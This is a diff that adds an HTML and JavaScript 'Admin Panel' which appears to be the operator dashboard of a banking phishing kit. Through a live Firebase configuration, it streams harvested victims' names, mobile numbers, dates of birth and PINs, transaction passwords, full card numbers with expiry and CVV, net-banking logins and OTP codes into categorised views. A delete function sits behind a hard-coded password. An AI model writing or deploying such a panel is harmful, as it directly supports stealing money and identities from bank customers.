@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel - Live Data</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    h2 {
+      text-align: center;
+      color: #00169e;
+      margin-top: 20px;
+    }
+    .nav-buttons {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      margin: 20px;
+    }
+    .nav-buttons button {
+      background-color: #00169e;
+      color: white;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 10px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .section {
+      display: none;
+      margin: 0 16px 30px;
+      padding: 20px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0px 0px 8px rgba(0,0,0,0.1);
+    }
+    .section.active {
+      display: block;
+    }
+    .entry {
+      background: #f9f9f9;
+      border: 1px solid #ddd;
+      padding: 10px 15px;
+      border-radius: 10px;
+      margin-bottom: 15px;
+    }
+    .delete-btn {
+      background-color: red;
+      color: white;
+      border: none;
+      padding: 4px 10px;
+      border-radius: 6px;
+      float: right;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    @media screen and (min-width: 768px) {
+      .section {
+        max-width: 600px;
+        margin: 0 auto 30px;
+      }
+    }
+  </style>
+
+  <!-- Firebase CDN -->
+  <script src="https://www.gstatic.com/firebasejs/11.6.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/11.6.0/firebase-firestore-compat.js"></script>
+</head>
+
+<body>
+<h2>Admin Panel - Live Data</h2>
+
+<div class="nav-buttons">
+  <button onclick="showSection('usersSection')">User</button>
+  <button onclick="showSection('dobPinSection')">DOB + PIN</button>
+  <button onclick="showSection('txnPasswordSection')">Txn</button>
+  <button onclick="showSection('cardPaymentSection')">Card</button>
+  <button onclick="showSection('netbankingSection')">NetBanking</button>
+  <button onclick="showSection('otpSection')">OTP</button>
+  <button onclick="showSection('combinedSection')">All</button>
+</div>
+
+<div id="usersSection" class="section active"><h3>1. User Details</h3></div>
+<div id="dobPinSection" class="section"><h3>2. DOB + PIN</h3></div>
+<div id="txnPasswordSection" class="section"><h3>3. Transaction Passwords</h3></div>
+<div id="cardPaymentSection" class="section"><h3>4. Card Payments</h3></div>
+<div id="netbankingSection" class="section"><h3>5. NetBanking Logins</h3></div>
+<div id="otpSection" class="section"><h3>6. OTP Entries</h3></div>
+<div id="combinedSection" class="section"><h3>7. All Submissions</h3></div>
+
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyA9WgN2dTGE9dL24tXnyfZmTQ9ckBSdwyI",
+    authDomain: "vjjal-42a4d.firebaseapp.com",
+    databaseURL: "https://vjjal-42a4d-default-rtdb.firebaseio.com",
+    projectId: "vjjal-42a4d",
+    storageBucket: "vjjal-42a4d.appspot.com",
+    messagingSenderId: "34684969145",
+    appId: "1:34684969145:web:c81f26ad11e9e1685efb68"
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+
+  function showSection(id) {
+    document.querySelectorAll('.section').forEach(sec => {
+      sec.classList.remove('active');
+    });
+    document.getElementById(id).classList.add('active');
+  }
+
+  function renderEntry(sectionId, html, docId, collection, label = "", timestamp = null) {
+    const section = document.getElementById(sectionId);
+    const div = document.createElement('div');
+    div.className = 'entry';
+    const timeHtml = timestamp 
+      ? `<p style="font-size: 10px; color: gray; margin-top: 5px;">${new Date(timestamp.seconds * 1000).toLocaleString()}</p>` 
+      : '';
+
+    div.innerHTML = (label ? `<h4>${label}</h4>` : '') + html + timeHtml +
+      `<button class='delete-btn' onclick="deleteEntry('${collection}', '${docId}')">Delete</button>`;
+    section.appendChild(div);
+  }
+
+  function clearSection(sectionId, heading) {
+    document.getElementById(sectionId).innerHTML = `<h3>${heading}</h3>`;
+  }
+
+  function deleteEntry(collection, docId) {
+    const pass = prompt("Enter delete password:");
+    if (pass === "4542") {
+      db.collection(collection).doc(docId).delete()
+        .then(() => alert("Entry deleted."))
+        .catch(err => alert("Error deleting: " + err));
+    } else {
+      alert("Incorrect password");
+    }
+  }
+
+  db.collection("users").orderBy("timestamp", "desc").onSnapshot(snapshot => {
+    clearSection("usersSection", "1. User Details");
+    clearSection("combinedSection", "7. All Submissions");
+    snapshot.docs.forEach(doc => {
+      const d = doc.data();
+      const html = `<p><strong>Name:</strong> ${d.name}</p><p><strong>KNO:</strong> ${d.kno}</p><p><strong>Mobile:</strong> ${d.mobile}</p>`;
+      renderEntry("usersSection", html, doc.id, "users", "", d.timestamp);
+      renderEntry("combinedSection", html, doc.id, "users", "User Detail", d.timestamp);
+    });
+  });
+
+  db.collection("dob_pin").orderBy("timestamp", "desc").onSnapshot(snapshot => {
+    clearSection("dobPinSection", "2. DOB + PIN");
+    snapshot.docs.forEach(doc => {
+      const d = doc.data();
+      const html = `<p><strong>DOB:</strong> ${d.dob}</p><p><strong>PIN:</strong> ${d.pin}</p>`;
+      renderEntry("dobPinSection", html, doc.id, "dob_pin", "", d.timestamp);
+      renderEntry("combinedSection", html, doc.id, "dob_pin", "DOB + PIN", d.timestamp);
+    });
+  });
+
+  db.collection("txn_passwords").orderBy("timestamp", "desc").onSnapshot(snapshot => {
+    clearSection("txnPasswordSection", "3. Transaction Passwords");
+    snapshot.docs.forEach(doc => {
+      const d = doc.data();
+      const html = `<p><strong>Password:</strong> ${d.password}</p>`;
+      renderEntry("txnPasswordSection", html, doc.id, "txn_passwords", "", d.timestamp);
+      renderEntry("combinedSection", html, doc.id, "txn_passwords", "Txn Password", d.timestamp);
+    });
+  });
+
+  db.collection("payments").orderBy("timestamp", "desc").onSnapshot(snapshot => {
+    clearSection("cardPaymentSection", "4. Card Payments");
+    clearSection("netbankingSection", "5. NetBanking Logins");
+    snapshot.docs.forEach(doc => {
+      const d = doc.data();
+      if (d.method && d.method.includes("card")) {
+        const html = `<p><strong>Card:</strong> ${d.card}</p><p><strong>Expiry:</strong> ${d.expiry}</p><p><strong>CVV:</strong> ${d.cvv}</p>`;
+        renderEntry("cardPaymentSection", html, doc.id, "payments", "", d.timestamp);
+        renderEntry("combinedSection", html, doc.id, "payments", "Card Detail", d.timestamp);
+      } else {
+        const html = `<p><strong>Bank:</strong> ${d.bank}</p><p><strong>User:</strong> ${d.username}</p><p><strong>Password:</strong> ${d.password}</p>`;
+        renderEntry("netbankingSection", html, doc.id, "payments", "", d.timestamp);
+        renderEntry("combinedSection", html, doc.id, "payments", "NetBanking", d.timestamp);
+      }
+    });
+  });
+
+  db.collection("otp_entries").orderBy("timestamp", "desc").onSnapshot(snapshot => {
+    clearSection("otpSection", "6. OTP Entries");
+    snapshot.docs.forEach(doc => {
+      const d = doc.data();
+      const html = `<p><strong>OTP:</strong> ${d.otp}</p><p><strong>Attempt:</strong> ${d.attempt}</p>`;
+      renderEntry("otpSection", html, doc.id, "otp_entries", "", d.timestamp);
+      renderEntry("combinedSection", html, doc.id, "otp_entries", "OTP", d.timestamp);
+    });
+  });
+</script>
+</body>
+</html>
